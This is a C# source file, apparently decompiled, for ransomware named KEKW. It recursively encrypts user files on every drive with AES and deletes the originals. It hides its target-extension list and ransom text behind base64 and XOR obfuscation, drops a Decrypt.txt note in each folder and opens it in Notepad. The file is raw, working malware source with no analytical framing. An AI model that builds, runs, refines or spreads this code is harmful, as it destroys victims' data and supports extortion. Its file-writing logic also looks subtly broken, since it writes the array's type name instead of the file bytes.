using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace KEKW;

internal class Program
{
	private static void EncryptFile(ICryptoTransform encryptor, string path, string extension)
	{
		try
		{
			byte[] value = File.ReadAllBytes(path);
			using FileStream stream = File.Open(path + "." + extension, FileMode.CreateNew);
			using (CryptoStream stream2 = new CryptoStream(stream, encryptor, CryptoStreamMode.Write))
			{
				using StreamWriter streamWriter = new StreamWriter(stream2);
				streamWriter.Write(value);
			}
			File.Delete(path);
		}
		catch (Exception)
		{
		}
	}

	private static void HandleDirectory(ICryptoTransform encryptor, string path, string extension, string[] extensions, string msg)
	{
		if (path.Contains("Program Files") || path.Contains("C:\\Windows"))
		{
			return;
		}
		try
		{
			foreach (string item in Directory.EnumerateDirectories(path))
			{
				HandleDirectory(encryptor, item, extension, extensions, msg);
			}
			foreach (string item2 in Directory.EnumerateFiles(path))
			{
				string value = item2.Split(new char[1] { '.' }).Last().ToLower();
				if (extensions.Contains(value))
				{
					EncryptFile(encryptor, item2, extension);
				}
			}
			File.WriteAllText(path + "\\Decrypt.txt", msg);
		}
		catch (Exception)
		{
		}
	}

	private static string d(string s, int k)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < s.Length; i++)
		{
			stringBuilder.Append((char)(s[i] ^ k));
		}
		return stringBuilder.ToString();
	}

	private static void Main(string[] args)
	{
		using AesManaged aesManaged = new AesManaged();
		ICryptoTransform encryptor = aesManaged.CreateEncryptor();
		string s = "YXV3bWNld21laWVtdX5ybXV+cmlte2JteWV8fW1heWFtcm1yYmJtcmJtaX1ibWFhZW17YXZtfGEibXxhJW1yYmdtcGd4bXllfH1teWV8fW12eHdtYWFlaW1lcGNta3hhbXZrbWNwY20ma21mcGdtc3xhbXN4f211cGVtcmFhbXlte2F0dm18fmdtfGF2bWNwY21hf3Y=";
		string s2 = "QVJdQFxeM15WQEBSVFYZVFpFVjNeVjMiM15aX19aXF0zUVpHUFxaXTNyZzNBUl1AXF49fH16fH0ZUlZAM1Z9cGFqY2d6fH0zWHZqKTMveHZqLRlSVkAzVn1wYWpjZ3p8fTNaRSkzL3plLQ==";
		string text = d(Encoding.UTF8.GetString(Convert.FromBase64String(s2)), 19).Replace("<key>", Convert.ToBase64String(aesManaged.Key)).Replace("<iv>", Convert.ToBase64String(aesManaged.IV));
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				HandleDirectory(encryptor, driveInfo.RootDirectory.FullName, "KEKW", d(Encoding.UTF8.GetString(Convert.FromBase64String(s)), 17).Split(new char[1] { '|' }), text);
			}
			File.WriteAllText("Decrypt.txt", text);
			Process.Start("notepad.exe", "Decrypt.txt");
		}
		catch (Exception)
		{
		}
	}
}
